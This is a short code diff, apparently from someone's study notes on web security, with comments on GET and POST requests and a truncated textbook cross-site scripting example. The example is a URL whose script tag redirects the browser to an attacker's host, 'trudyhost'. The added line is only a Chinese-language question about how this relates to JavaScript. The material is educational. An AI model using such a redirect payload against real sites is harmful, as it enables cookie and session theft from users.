@@ -3,6 +3,7 @@ import re
 # get: send parameters through URL in the form of querystring
 # post: send via HTTP message body.
 # 有可能inject malicious code into the URLs
+# Q：这好像和JS关系不大？
 """
 http://host/personalizedpage.php?username=<script>
 document.location='http://trudyhost/cgi-bin/
